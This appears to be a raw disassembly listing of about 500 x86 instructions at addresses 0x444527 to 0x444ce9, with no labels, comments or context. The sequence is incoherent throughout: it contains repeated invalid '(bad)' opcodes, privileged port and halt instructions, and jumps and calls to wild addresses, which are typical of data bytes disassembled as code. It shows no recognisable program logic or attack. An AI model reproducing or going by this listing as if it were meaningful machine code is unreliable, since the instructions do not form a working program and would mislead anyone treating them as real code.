  444527:	dec    ebx
  444528:	sbb    ah,BYTE PTR [ecx-0x65]
  44452b:	jmp    0xf578:0xd4e5cb48
  444532:	xchg   cl,al
  444534:	adc    eax,0x88d1267b
  444539:	mov    ecx,0x9441e042
  44453e:	sbb    bl,BYTE PTR [ecx+0x6b]
  444541:	add    esp,eax
  444543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444544:	or     al,0x84
  444546:	inc    esp
  444547:	xor    al,0x25
  444549:	out    0x1f,al
  44454b:	or     ecx,ebp
  44454d:	cmp    al,BYTE PTR [ecx]
  44454f:	ds xchg cl,dh
  444552:	aad    0xbb
  444554:	mov    cl,0x77
  444556:	pop    ebp
  444557:	sub    edx,DWORD PTR [ecx+eax*2+0x5f]
  44455b:	inc    edx
  44455c:	shl    DWORD PTR [ebx+eiz*2+0x756d89e6],cl
  444563:	pop    ds
  444564:	aas    
  444565:	lods   eax,DWORD PTR ds:[esi]
  444566:	sub    eax,edi
  444568:	out    dx,al
  444569:	add    bl,BYTE PTR [esi-0x27]
  44456c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44456d:	shl    BYTE PTR [ebp+0x7b],cl
  444570:	jnp    0x4445c0
  444572:	push   ds
  444573:	addr16 mov ecx,0x5e03acf6
  444579:	call   0x5042f83a
  44457e:	push   esi
  44457f:	aad    0x41
  444581:	mov    fs,ebp
  444583:	daa    
  444584:	push   edi
  444585:	mov    esp,0x19896880
  44458a:	sbb    BYTE PTR [ebx+edx*8-0x7190da9],0x5
  444592:	(bad)  
  444593:	jmp    0xd4ef014d
  444598:	mov    dl,bl
  44459a:	sar    BYTE PTR [ecx-0x3ce1acb6],0xab
  4445a1:	inc    esp
  4445a2:	lea    esi,[ecx]
  4445a4:	push   ss
  4445a5:	fimul  WORD PTR [edx-0x2b]
  4445a8:	jmp    0x4445b1
  4445aa:	enter  0x93ae,0xf0
  4445ae:	jae    0x444600
  4445b0:	mov    BYTE PTR [ebp-0x67],dl
  4445b3:	out    dx,al
  4445b4:	imul   esp,DWORD PTR [edi],0x38
  4445b7:	das    
  4445b8:	repnz aad 0xd2
  4445bb:	(bad)  
  4445bc:	sub    DWORD PTR [ebx],ecx
  4445be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4445bf:	push   ebp
  4445c0:	outs   dx,DWORD PTR ds:[esi]
  4445c1:	popa   
  4445c2:	dec    edi
  4445c3:	cmc    
  4445c4:	je     0x444607
  4445c6:	push   ds
  4445c7:	daa    
  4445c8:	jnp    0x44461e
  4445ca:	sbb    edi,esp
  4445cc:	and    ecx,DWORD PTR [eax-0x5376bc39]
  4445d2:	pop    ds
  4445d3:	sub    eax,0xa1a5b02e
  4445d8:	test   BYTE PTR [edx+0x6118c91f],al
  4445de:	fwait
  4445df:	add    esi,esi
  4445e1:	cmp    ebp,ebx
  4445e3:	std    
  4445e4:	ss sub eax,0x8ebcf66c
  4445ea:	data16 xor bl,bl
  4445ed:	add    al,0xbf
  4445ef:	and    DWORD PTR fs:[eax+0x1f],eax
  4445f3:	out    0x30,eax
  4445f5:	loop   0x444666
  4445f7:	imul   esi,DWORD PTR [esi+0xdd7e82c],0x8c72af26
  444601:	scas   eax,DWORD PTR es:[edi]
  444602:	push   esi
  444603:	or     al,0xe4
  444605:	jecxz  0x444667
  444607:	das    
  444608:	and    eax,esi
  44460a:	shl    DWORD PTR [edx-0x2b3527e8],cl
  444610:	pop    ebx
  444611:	xchg   ebp,eax
  444612:	jno    0x4445a6
  444614:	(bad)  
  444615:	fidiv  WORD PTR [ebx+0x5bb158d0]
  44461b:	sbb    DWORD PTR [eax-0x28],0x1f
  44461f:	mov    ah,0x3f
  444621:	jecxz  0x4445f1
  444623:	fisttp QWORD PTR [edi+0x63]
  444626:	dec    eax
  444627:	mov    al,0x69
  444629:	mov    al,ds:0xe9f189d4
  44462e:	test   ebp,edx
  444630:	ret    
  444631:	retf   0xb376
  444634:	les    esp,FWORD PTR [ecx-0x53cf2b6f]
  44463a:	and    bh,BYTE PTR [eax]
  44463c:	adc    bl,BYTE PTR [eax+0xd8c8273]
  444642:	sbb    eax,0x1a16df8
  444647:	push   esp
  444648:	and    al,0x22
  44464a:	dec    eax
  44464b:	aad    0xa0
  44464d:	loope  0x4446c2
  44464f:	in     eax,dx
  444650:	jmp    0x7325425d
  444655:	fcmovnbe st,st(0)
  444657:	mov    al,0x8b
  444659:	xor    DWORD PTR [esi+0x13],ebp
  44465c:	test   BYTE PTR [edi],ah
  44465e:	dec    esi
  44465f:	push   esp
  444660:	and    BYTE PTR [ebx],ch
  444662:	jecxz  0x444638
  444664:	arpl   WORD PTR [ebp-0x7fbef22d],sp
  44466a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44466b:	repnz mov bh,ah
  44466e:	in     al,0x4b
  444670:	pop    ecx
  444671:	mov    bl,0xdb
  444673:	mov    BYTE PTR [eax-0x76bcec77],0x38
  44467a:	mov    ch,0x84
  44467c:	icebp  
  44467d:	je     0x4446fb
  44467f:	pop    ds
  444680:	hlt    
  444681:	aad    0x91
  444683:	shl    DWORD PTR [edx+0x6971665c],1
  444689:	sahf   
  44468a:	pop    ecx
  44468b:	adc    eax,0xd4cda1b6
  444690:	fild   DWORD PTR [esi]
  444692:	mov    esi,0xac130553
  444697:	or     DWORD PTR [edi+0x185e4d03],0x2c
  44469e:	dec    ebx
  44469f:	jne    0x444626
  4446a1:	cld    
  4446a2:	pop    esp
  4446a3:	mov    ah,0x5f
  4446a5:	add    DWORD PTR [edi+ebx*4+0x7e98cdf1],esp
  4446ac:	leave  
  4446ad:	mov    ebp,0xf9898530
  4446b2:	idiv   BYTE PTR [edx]
  4446b4:	or     edi,0x4b1180ea
  4446ba:	stos   BYTE PTR es:[edi],al
  4446bb:	retf   
  4446bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4446bd:	test   BYTE PTR [ebx-0x57],bl
  4446c0:	dec    esi
  4446c1:	mov    dh,0x90
  4446c3:	aad    0x7a
  4446c5:	out    0x5d,al
  4446c7:	mov    edi,0xb31f1ccf
  4446cc:	mov    cl,0x74
  4446ce:	cmp    BYTE PTR [edi-0x52d33f92],dl
  4446d4:	and    al,0x3f
  4446d6:	cmp    ah,BYTE PTR [ebx]
  4446d8:	push   ss
  4446d9:	xchg   ecx,eax
  4446da:	lock pusha 
  4446dc:	arpl   bx,di
  4446de:	pop    ds
  4446df:	inc    ebp
  4446e0:	shr    eax,0xa4
  4446e3:	pop    esi
  4446e4:	sbb    bh,BYTE PTR [eax]
  4446e6:	mov    edi,0x3faf40d5
  4446eb:	aas    
  4446ec:	or     BYTE PTR [ecx+0x3589d78e],dl
  4446f2:	mov    bl,BYTE PTR [ecx+0x10]
  4446f5:	mov    edx,0x15769835
  4446fa:	out    0x73,al
  4446fc:	leave  
  4446fd:	and    BYTE PTR [ebx+0x3b],cl
  444700:	sub    al,0x3a
  444702:	pop    esi
  444703:	mov    ebp,0x7188a789
  444708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444709:	adc    eax,0x86d43d7
  44470e:	pusha  
  44470f:	sub    ecx,edi
  444711:	sub    DWORD PTR [ecx-0x4370b9ca],0xa5141cd4
  44471b:	add    ebp,edi
  44471d:	fisttp DWORD PTR [ecx]
  44471f:	dec    esi
  444720:	jo     0x444774
  444722:	push   ds
  444723:	(bad)  
  444724:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444725:	xor    DWORD PTR [edi],edi
  444727:	adc    DWORD PTR [ecx+0x165de835],ebx
  44472d:	xchg   edi,eax
  44472e:	pop    es
  44472f:	(bad)  
  444730:	xchg   ebx,eax
  444731:	rcl    BYTE PTR [ecx+edx*2+0x257e5930],cl
  444738:	in     al,0xa5
  44473a:	pop    ds
  44473b:	jge    0x44479a
  44473d:	inc    esi
  44473e:	add    al,0x2b
  444740:	dec    eax
  444741:	xor    al,0xd3
  444743:	aam    0xf7
  444745:	sub    eax,0xce8ba39f
  44474a:	leave  
  44474b:	dec    esp
  44474c:	mov    bl,BYTE PTR [edi+0x60]
  44474f:	das    
  444750:	icebp  
  444751:	mov    ds:0xed3ed17b,eax
  444756:	xchg   esi,eax
  444757:	lds    ebp,FWORD PTR [esi]
  444759:	fs cli 
  44475b:	aad    0x59
  44475d:	mov    ds:0x795ef7cf,al
  444762:	sbb    eax,0x5ef3899b
  444767:	mov    bl,0xe
  444769:	hlt    
  44476a:	aaa    
  44476b:	adc    al,0xef
  44476d:	add    BYTE PTR [eax+ebp*4+0x79c1501f],ch
  444774:	and    DWORD PTR [eax-0x1ceb5eeb],eax
  44477a:	iret   
  44477b:	pop    es
  44477c:	mov    BYTE PTR ds:0x1591269b,dh
  444782:	test   al,0xc7
  444784:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444785:	add    eax,0xeb764e9e
  44478a:	jle    0x444800
  44478c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44478d:	dec    eax
  44478e:	push   ds
  44478f:	xchg   DWORD PTR [edi-0x9],edi
  444792:	jmp    0xfd4b054e
  444797:	inc    edx
  444798:	sbb    ah,BYTE PTR [eax+0x5a]
  44479b:	(bad)  
  44479c:	adc    eax,0x9fac5083
  4447a1:	bound  edx,QWORD PTR [edi]
  4447a3:	xor    dh,dl
  4447a5:	sub    eax,0xa0b2d54f
  4447aa:	ror    BYTE PTR [esi-0x2a5382ce],1
  4447b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4447b1:	cmp    edi,DWORD PTR [ebx-0x22daf898]
  4447b7:	pop    edx
  4447b8:	mov    BYTE PTR [ecx-0x77],bh
  4447bb:	std    
  4447bc:	clc    
  4447bd:	mov    WORD PTR [edx],es
  4447bf:	nop
  4447c0:	stos   DWORD PTR es:[edi],eax
  4447c1:	add    al,BYTE PTR [eax]
  4447c3:	xchg   ebp,eax
  4447c4:	xor    DWORD PTR [ecx],0x38
  4447c7:	mov    al,0x23
  4447c9:	cli    
  4447ca:	pop    ds
  4447cb:	scas   eax,DWORD PTR es:[edi]
  4447cc:	jge    0x44475c
  4447ce:	sbb    BYTE PTR [eax],0xa2
  4447d1:	mov    dl,0xe5
  4447d3:	aad    0xa5
  4447d5:	mov    edx,0xf477a8bf
  4447da:	add    eax,0xeb838965
  4447df:	sbb    eax,DWORD PTR [esi+0x5b]
  4447e2:	sub    eax,0xb202d906
  4447e7:	sbb    DWORD PTR [edx-0x1e05f666],edi
  4447ed:	ss pop ds
  4447ef:	push   ebx
  4447f0:	mov    ah,BYTE PTR [edx-0x539fa6b4]
  4447f6:	dec    edi
  4447f7:	jmp    0xacf24da3
  4447fc:	inc    edi
  4447fd:	inc    ecx
  4447ff:	in     eax,dx
  444800:	xchg   ebx,eax
  444801:	inc    esi
  444802:	pop    ds
  444803:	fwait
  444804:	xchg   edx,eax
  444805:	stc    
  444806:	ds test al,0x8f
  444809:	imul   edi,DWORD PTR [ebx],0x41
  44480c:	inc    esp
  44480d:	mov    esp,DWORD PTR [eax-0x79]
  444810:	les    ecx,FWORD PTR [eax]
  444812:	leave  
  444813:	or     al,0xc8
  444815:	test   DWORD PTR [edi],ebx
  444817:	inc    edi
  444818:	mov    ecx,0xca3febf1
  44481d:	outs   dx,BYTE PTR ds:[esi]
  44481e:	mov    bl,0xd5
  444820:	jns    0x44489f
  444822:	cwde   
  444823:	adc    eax,ebp
  444825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444826:	inc    ebp
  444827:	loop   0x4447b3
  444829:	retf   
  44482a:	mov    eax,ds:0x322a57a1
  44482f:	test   BYTE PTR [eax],dh
  444831:	jge    0x4448a0
  444833:	aam    0x59
  444835:	pop    edx
  444836:	fistp  WORD PTR [edx]
  444838:	mov    WORD PTR [eax-0x1e76963b],ss
  44483e:	mov    esp,0xe3798cd7
  444843:	xor    edx,DWORD PTR [ebp-0x23f96de4]
  444849:	fdiv   QWORD PTR [esi+0x37]
  44484c:	jns    0x444839
  44484e:	add    BYTE PTR [edi-0x77],cl
  444851:	mov    cl,0x6e
  444853:	cmc    
  444854:	(bad)  
  444856:	push   ebp
  444857:	cld    
  444858:	call   0xbe14b45f
  44485d:	test   BYTE PTR [esi],bh
  44485f:	mov    edx,0x71fc348
  444864:	xrelease xchg BYTE PTR [ecx-0x37801533],bl
  44486b:	les    ecx,FWORD PTR [edi]
  44486d:	add    ebx,DWORD PTR [eax-0x14]
  444870:	fstp   TBYTE PTR [ebp+0x2f]
  444873:	mov    bh,0x6
  444875:	ja     0x44488b
  444877:	push   0xffffff8e
  444879:	or     DWORD PTR [ebx+esi*4-0x52e568db],ebx
  444880:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444881:	and    BYTE PTR [ebp+ecx*1+0xb],0x3
  444886:	mov    eax,0x4ebbca7b
  44488b:	add    eax,0x49609c82
  444890:	add    dh,cl
  444892:	xchg   edi,eax
  444893:	pop    ebx
  444894:	pusha  
  444895:	or     BYTE PTR [eax],bl
  444897:	stos   BYTE PTR es:[edi],al
  444898:	xchg   edx,eax
  444899:	sub    al,0x82
  44489b:	shr    dl,0x25
  44489e:	pop    ecx
  44489f:	mov    ebp,DWORD PTR [ecx+esi*8]
  4448a2:	pop    ds
  4448a3:	adc    DWORD PTR [esi+0x6897f773],ecx
  4448a9:	mov    al,0x1a
  4448ab:	lock xor esp,DWORD PTR [edi]
  4448ae:	sub    bl,BYTE PTR [ebp+eiz*2+0x4a4620cd]
  4448b5:	or     BYTE PTR [edx],ch
  4448b7:	test   al,0xc0
  4448b9:	popa   
  4448ba:	rcr    BYTE PTR [eax-0x2915fe78],0x2c
  4448c1:	add    eax,0xe66daa86
  4448c6:	sbb    al,0x81
  4448c8:	or     DWORD PTR [ebx],eax
  4448ca:	mov    cl,0xef
  4448cc:	fisub  WORD PTR [edx+0x3ff3f760]
  4448d2:	jecxz  0x4448b0
  4448d4:	sub    BYTE PTR [eax],0x1c
  4448d7:	aam    0xd3
  4448d9:	ret    0x948b
  4448dc:	jb     0x444873
  4448de:	mov    cl,0xdd
  4448e0:	mov    DWORD PTR [ebx-0x9b5a905],edx
  4448e6:	js     0x4448e3
  4448e8:	imul   eax,DWORD PTR [ebx],0x62f8ada2
  4448ee:	repz add BYTE PTR [esi-0x2b],bl
  4448f2:	outs   dx,BYTE PTR ds:[esi]
  4448f3:	lods   eax,DWORD PTR ds:[esi]
  4448f4:	ret    0xfd28
  4448f7:	ror    DWORD PTR [ecx+0x5],1
  4448fa:	test   eax,0x4d0cf465
  4448ff:	mov    ebx,0x82f5d510
  444904:	jne    0x444909
  444906:	out    0x3d,al
  444908:	add    eax,esi
  44490a:	ret    0xf54d
  44490d:	add    esi,DWORD PTR [ecx]
  44490f:	xlat   BYTE PTR ds:[ebx]
  444910:	push   edi
  444911:	or     al,0xb5
  444913:	jo     0x4448be
  444915:	push   ebx
  444916:	(bad)  
  444917:	pop    ebx
  444918:	push   ebp
  444919:	pop    ss
  44491a:	arpl   WORD PTR [edx+0x918fdf0],di
  444920:	dec    eax
  444921:	and    dl,BYTE PTR [edx+0x12]
  444924:	mov    BYTE PTR [edi],cl
  444926:	and    dh,ah
  444928:	imul   esi,DWORD PTR ds:0x227b2bf,0x40
  44492f:	add    DWORD PTR [edx+0x58daffa9],edx
  444935:	lock adc DWORD PTR [esi-0x77],edx
  444939:	xchg   edi,edi
  44493b:	lea    ebp,[edx+0x2515bfdc]
  444941:	jae    0x44496d
  444943:	outs   dx,BYTE PTR cs:[esi]
  444945:	add    ch,dl
  444947:	rol    DWORD PTR [eax-0x15c0e6e3],cl
  44494d:	adc    BYTE PTR [edi+eiz*4],0xc5
  444951:	mov    cl,0x75
  444953:	dec    eax
  444954:	mov    BYTE PTR [ebx+0x295abf7c],bl
  44495a:	pop    ss
  44495b:	aam    0x7f
  44495d:	pop    edx
  44495e:	pusha  
  44495f:	pop    esp
  444960:	jne    0x4449c1
  444962:	xchg   BYTE PTR ds:0xf1677248,bh
  444968:	lods   al,BYTE PTR ds:[esi]
  444969:	xchg   bh,ch
  44496b:	rol    esp,cl
  44496d:	cmp    bh,ah
  44496f:	jmp    FWORD PTR [edx+0x33]
  444972:	out    dx,eax
  444973:	dec    esp
  444974:	test   al,bh
  444976:	pop    ds
  444977:	ret    
  444978:	dec    ebp
  444979:	wrmsr  
  44497b:	js     0x444975
  44497d:	inc    eax
  44497e:	mov    ebp,edx
  444980:	cmp    al,0xac
  444982:	xchg   ecx,eax
  444983:	jne    0x444970
  444985:	cmp    DWORD PTR [ebp*8-0x5097c148],ebp
  44498c:	and    DWORD PTR [esi+0x40],edx
  44498f:	call   0xc245c89d
  444994:	pop    ecx
  444995:	xchg   ebx,eax
  444996:	jae    0x444a0f
  444998:	mov    DWORD PTR [edi],ecx
  44499a:	nop
  44499b:	ds loopne 0x444a04
  44499e:	add    al,0xb2
  4449a0:	xrelease xchg DWORD PTR [ecx-0x1875bda2],ecx
  4449a7:	sbb    eax,0xddd027bb
  4449ac:	add    al,0xc3
  4449ae:	retf   0x9819
  4449b1:	sub    al,0x29
  4449b3:	xlat   BYTE PTR ds:[ebx]
  4449b4:	popf   
  4449b5:	xchg   ebp,eax
  4449b6:	xchg   ebx,eax
  4449b7:	push   ds
  4449b8:	shl    edi,1
  4449ba:	sbb    bl,BYTE PTR [edi-0x78]
  4449bd:	mov    eax,ds:0xd479b4d1
  4449c2:	ds scas al,BYTE PTR es:[edi]
  4449c4:	dec    edi
  4449c5:	adc    al,0x4a
  4449c7:	fbld   TBYTE PTR [esi+0x40]
  4449ca:	aas    
  4449cb:	je     0x4449a2
  4449cd:	jge    0x444a28
  4449cf:	jecxz  0x44495f
  4449d1:	inc    ebx
  4449d2:	ins    BYTE PTR es:[edi],dx
  4449d3:	lods   eax,DWORD PTR fs:[esi]
  4449d5:	je     0x444a17
  4449d7:	test   DWORD PTR [edx-0x62b6422],eax
  4449dd:	std    
  4449de:	aaa    
  4449df:	add    al,BYTE PTR ds:0xe9a5f749
  4449e5:	out    0x1f,al
  4449e7:	pop    ebp
  4449e8:	xchg   esi,eax
  4449e9:	out    dx,eax
  4449ea:	sub    eax,0x69e1117f
  4449ef:	pop    ebx
  4449f0:	pop    eax
  4449f1:	daa    
  4449f2:	pop    ds
  4449f3:	dec    esi
  4449f4:	push   ds
  4449f5:	pop    ecx
  4449f6:	imul   ebx,DWORD PTR [edx],0x6b7d3593
  4449fc:	test   ebp,esp
  4449fe:	lods   al,BYTE PTR ds:[esi]
  4449ff:	ror    BYTE PTR [eax+0x5f5031b8],1
  444a05:	add    BYTE PTR [esi],0xd8
  444a08:	pop    edi
  444a09:	add    edx,DWORD PTR [eax+ebx*2+0x6f08133]
  444a10:	or     al,0x6d
  444a12:	xor    ch,bl
  444a14:	mov    BYTE PTR [ebx+0x30],bh
  444a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444a18:	xor    DWORD PTR [edx],ecx
  444a1a:	nop
  444a1b:	adc    ebp,DWORD PTR [edx+0x29b1e605]
  444a21:	cmp    al,al
  444a23:	cmc    
  444a24:	jns    0x444a8f
  444a26:	push   ds
  444a27:	cmp    DWORD PTR [ebp+0x27],eax
  444a2a:	jl     0x444a81
  444a2c:	and    DWORD PTR [esp+eiz*2+0x5b],edi
  444a30:	ret    0x1fdc
  444a33:	cs pop sp
  444a36:	ds xor bh,ah
  444a39:	stos   DWORD PTR es:[edi],eax
  444a3a:	pop    ds
  444a3b:	fwait
  444a3c:	test   BYTE PTR [ebx+0x1cc07dbe],bl
  444a42:	dec    ecx
  444a43:	stos   DWORD PTR es:[edi],eax
  444a44:	pop    edx
  444a45:	cld    
  444a46:	cmp    ebx,edi
  444a48:	inc    bx
  444a4a:	push   es
  444a4b:	pop    ecx
  444a4c:	scas   al,BYTE PTR es:[edi]
  444a4d:	inc    eax
  444a4e:	pop    ds
  444a4f:	lea    edx,[ecx-0xf806104]
  444a55:	into   
  444a56:	xchg   ah,dl
  444a58:	jnp    0x444a77
  444a5a:	outs   dx,DWORD PTR ds:[esi]
  444a5b:	popf   
  444a5c:	iret   
  444a5d:	pop    ebx
  444a5e:	jo     0x444a81
  444a60:	sti    
  444a61:	inc    ecx
  444a62:	je     0x444a39
  444a64:	mov    ebx,0x7ac04465
  444a69:	aam    0xfe
  444a6b:	aad    0x49
  444a6d:	add    BYTE PTR [ebp-0x26],dl
  444a70:	adc    esi,DWORD PTR [edx+ebp*8-0xec2778d]
  444a77:	and    dh,BYTE PTR [ebp+0x53]
  444a7a:	ss dec edx
  444a7c:	inc    esp
  444a7d:	mov    bl,0x85
  444a7f:	mov    al,0x89
  444a81:	pop    ss
  444a82:	pushf  
  444a83:	xchg   ebx,eax
  444a84:	in     al,dx
  444a85:	leave  
  444a86:	dec    ecx
  444a87:	imul   edx,DWORD PTR [edi+0xbd8903],0x26539b43
  444a91:	rcl    BYTE PTR [eax],1
  444a93:	xlat   BYTE PTR ds:[ebx]
  444a94:	push   esi
  444a95:	pop    esp
  444a96:	mov    eax,ds:0x1925dff9
  444a9b:	sbb    BYTE PTR [edi-0x7d],cl
  444a9e:	push   esi
  444a9f:	ror    DWORD PTR [eax+0x4b],1
  444aa2:	popa   
  444aa3:	sti    
  444aa4:	mul    BYTE PTR [ecx-0x5aaf927e]
  444aaa:	fistp  QWORD PTR [edx-0x63c1fd8e]
  444ab0:	cmp    BYTE PTR [eax-0x8315d69],dl
  444ab6:	pusha  
  444ab7:	outs   dx,DWORD PTR ds:[esi]
  444ab8:	cmp    edi,DWORD PTR [eax]
  444aba:	adc    edx,DWORD PTR [edi-0x2b6a51f6]
  444ac0:	push   edi
  444ac1:	call   0x65acdded
  444ac6:	xor    edx,eax
  444ac8:	mov    bh,ah
  444aca:	push   es
  444acb:	xchg   ecx,eax
  444acc:	rcr    DWORD PTR [edi],0x75
  444acf:	add    DWORD PTR [ebp+eax*1+0x73b813c6],0xab258506
  444ada:	pusha  
  444adb:	dec    ebx
  444adc:	xchg   ch,dl
  444ade:	add    eax,0x3fdcf294
  444ae3:	xlat   BYTE PTR ds:[ebx]
  444ae4:	mov    cl,0xad
  444ae6:	imul   eax,DWORD PTR [eax],0xffffff9d
  444ae9:	pop    es
  444aea:	mov    ebp,0x1f6ce996
  444aef:	jge    0x444aa2
  444af1:	bound  ecx,QWORD PTR [esi+eiz*1-0x2ba29520]
  444af8:	test   eax,0xf11bacd3
  444afd:	jl     0x444b4a
  444aff:	add    al,0x89
  444b01:	adc    DWORD PTR [ecx],edx
  444b03:	sbb    al,0x6d
  444b05:	xchg   ebp,eax
  444b06:	or     eax,0x840363e6
  444b0b:	test   BYTE PTR [bp-0x17],dl
  444b0f:	(bad)  
  444b10:	jbe    0x444ab5
  444b12:	pusha  
  444b13:	test   eax,0xe34d40bf
  444b18:	push   ss
  444b19:	imul   esp,DWORD PTR [edx+0x3bf563aa],0xd61c494c
  444b23:	xchg   edx,eax
  444b24:	js     0x444b5d
  444b26:	mov    bh,0x35
  444b28:	mov    BYTE PTR [edi+0x68],bl
  444b2b:	and    BYTE PTR [ebp-0x3a],cl
  444b2e:	pop    eax
  444b2f:	nop
  444b30:	jb     0x444b67
  444b32:	dec    edx
  444b33:	xor    eax,DWORD PTR [edi]
  444b35:	add    dl,BYTE PTR [edx]
  444b37:	out    dx,al
  444b38:	fs dec eax
  444b3a:	jl     0x444b7e
  444b3c:	mov    bl,0xd5
  444b3e:	ss in  eax,0x89
  444b41:	sbb    DWORD PTR ds:0x5b3ac8cd,ebp
  444b47:	in     eax,0x70
  444b49:	jae    0x444af5
  444b4b:	fimul  DWORD PTR [ecx-0x12e0137a]
  444b51:	call   0x9dcd7cc6
  444b56:	xchg   edi,eax
  444b57:	xlat   BYTE PTR ds:[ebx]
  444b58:	and    dh,BYTE PTR [edi+0x7]
  444b5b:	ss xchg esi,eax
  444b5d:	adc    al,0xd0
  444b5f:	and    al,BYTE PTR [ebx-0x70]
  444b62:	sbb    eax,0xc8aa87b4
  444b67:	in     al,dx
  444b68:	mov    BYTE PTR [ebp-0x14f105ce],ah
  444b6e:	mov    WORD PTR [ebp+0xbd21fcd],gs
  444b74:	mov    eax,0x89320aab
  444b79:	pop    ecx
  444b7a:	or     edx,esp
  444b7c:	cmp    DWORD PTR [ebx+ebp*2],ebx
  444b7f:	hlt    
  444b80:	add    ebp,DWORD PTR gs:[esi]
  444b83:	stos   BYTE PTR es:[edi],al
  444b84:	outs   dx,DWORD PTR ds:[esi]
  444b85:	adc    eax,0xc8a87e80
  444b8a:	dec    edi
  444b8b:	mov    BYTE PTR ds:[ebx+0x76fde0d2],ch
  444b92:	lock (bad) 
  444b94:	ins    BYTE PTR es:[edi],dx
  444b95:	add    al,BYTE PTR [esi]
  444b97:	xchg   esi,eax
  444b98:	fadd   DWORD PTR [ebp-0x7d]
  444b9b:	ss inc ebp
  444b9d:	mov    al,0x1f
  444b9f:	lods   eax,DWORD PTR ds:[esi]
  444ba0:	mov    DWORD PTR [eax-0x45],edx
  444ba3:	jp     0x444bac
  444ba5:	jno    0x444b2c
  444ba7:	inc    edi
  444ba8:	call   0xa5e3afbd
  444bad:	mov    eax,0xdb499bb6
  444bb2:	xchg   esp,eax
  444bb3:	sti    
  444bb4:	mov    DWORD PTR [ebp+0x5450a52d],ecx
  444bba:	add    DWORD PTR [ecx-0x27e7fdac],esi
  444bc0:	mov    ecx,DWORD PTR [eax]
  444bc2:	adc    dh,BYTE PTR [esp+esi*4]
  444bc5:	inc    edx
  444bc6:	jge    0x444c3d
  444bc8:	fsubrp st(1),st
  444bca:	jecxz  0x444be1
  444bcc:	dec    ecx
  444bcd:	nop
  444bce:	lea    esp,[ebp+0x65]
  444bd1:	add    dl,BYTE PTR [edx+0x56b2ff0e]
  444bd7:	dec    esi
  444bd8:	in     al,0x30
  444bda:	pop    ds
  444bdb:	jno    0x444c09
  444bdd:	out    dx,eax
  444bde:	pop    eax
  444bdf:	dec    BYTE PTR [esi+0x609ce60f]
  444be5:	aad    0x12
  444be7:	mov    ch,0xf6
  444be9:	mov    ds,WORD PTR [edx+0x38]
  444bec:	cmp    BYTE PTR [ecx+0x1e],0x21
  444bf0:	leave  
  444bf1:	adc    ah,cl
  444bf3:	or     DWORD PTR [eax+0x9f16098],ebp
  444bf9:	pop    esp
  444bfa:	mov    dl,0x63
  444bfc:	js     0x444c02
  444bfe:	sub    eax,0xd68aded4
  444c03:	dec    esi
  444c04:	pop    esp
  444c05:	add    WORD PTR [eax+0x10ed2b88],cx
  444c0c:	push   ecx
  444c0d:	ja     0x444b9c
  444c0f:	dec    esp
  444c10:	add    cl,BYTE PTR [edi+0x3788592b]
  444c16:	in     eax,dx
  444c17:	mov    ds:0x8b5fbb0a,eax
  444c1c:	mov    DWORD PTR [ecx],ebp
  444c1e:	sbb    dl,BYTE PTR [ecx-0x504c6dc4]
  444c24:	pop    edi
  444c25:	dec    eax
  444c26:	(bad)  
  444c27:	das    
  444c28:	inc    ecx
  444c29:	add    BYTE PTR [edi-0x7a],0xef
  444c2d:	dec    ecx
  444c2e:	mov    BYTE PTR [eax],dl
  444c30:	mov    bl,BYTE PTR [ebx+0x2a]
  444c33:	add    bh,ah
  444c35:	adc    al,0x15
  444c37:	js     0x444c51
  444c39:	in     eax,0xe0
  444c3b:	aam    0x58
  444c3d:	sti    
  444c3e:	mov    al,0x60
  444c40:	xor    BYTE PTR [ebx+0x43888d72],dl
  444c46:	or     dh,BYTE PTR [esp+edx*1-0x2c630fa9]
  444c4d:	add    ch,BYTE PTR [edx-0x712ec69c]
  444c53:	loop   0x444c65
  444c55:	mov    ecx,0xd3341561
  444c5a:	aam    0x5a
  444c5c:	fwait
  444c5d:	add    al,0x3f
  444c5f:	jmp    0x8a684ecc
  444c64:	inc    ebp
  444c65:	push   edx
  444c66:	mov    bh,0xb9
  444c68:	sbb    al,0xa3
  444c6a:	pushf  
  444c6b:	dec    edi
  444c6c:	adc    ah,BYTE PTR [ebx+ebp*4]
  444c6f:	rol    BYTE PTR ss:[edx],0x26
  444c73:	into   
  444c74:	push   es
  444c75:	mov    dl,0x2
  444c77:	call   0x568c:0xd0254932
  444c7e:	scas   al,BYTE PTR es:[edi]
  444c7f:	inc    eax
  444c80:	or     DWORD PTR [ebp+ebp*4+0x199b89fd],esi
  444c87:	jb     0x444c9c
  444c89:	(bad)  [eax+0x4a02b97f]
  444c8f:	fs xchg edi,eax
  444c91:	jbe    0x444c19
  444c93:	call   0xe3a45c3e
  444c98:	ret    
  444c99:	lds    eax,FWORD PTR [edx+ebp*4-0x28fbf642]
  444ca0:	xchg   ecx,eax
  444ca1:	stos   DWORD PTR es:[edi],eax
  444ca2:	pop    es
  444ca3:	mov    ecx,0xf4b0cc2d
  444ca8:	xchg   esp,eax
  444ca9:	inc    edi
  444caa:	adc    edi,DWORD PTR [ecx+0x6f2bd7fc]
  444cb0:	leave  
  444cb1:	int3   
  444cb2:	sbb    eax,0x83e00c1c
  444cb7:	aam    0xbc
  444cb9:	loopne 0x444cf6
  444cbb:	sbb    bh,bl
  444cbd:	lock retf 0x8928
  444cc1:	mov    ebp,0x1b02772b
  444cc6:	and    al,BYTE PTR [esi+0x37b405fa]
  444ccc:	jne    0x444caf
  444cce:	call   0x7dd2f109
  444cd3:	aas    
  444cd4:	pop    ds
  444cd5:	xchg   esi,eax
  444cd6:	xchg   sp,ax
  444cd8:	mov    ah,0x72
  444cda:	repz inc esi
  444cdc:	sub    cl,BYTE PTR [ebx-0x4]
  444cdf:	sub    BYTE PTR [edi-0x7f],0xd9
  444ce3:	sbb    DWORD PTR [esi+ecx*1],ebp
  444ce6:	mov    ds,ebp
  444ce8:	pushf  
  444ce9:	in     al,0x6d
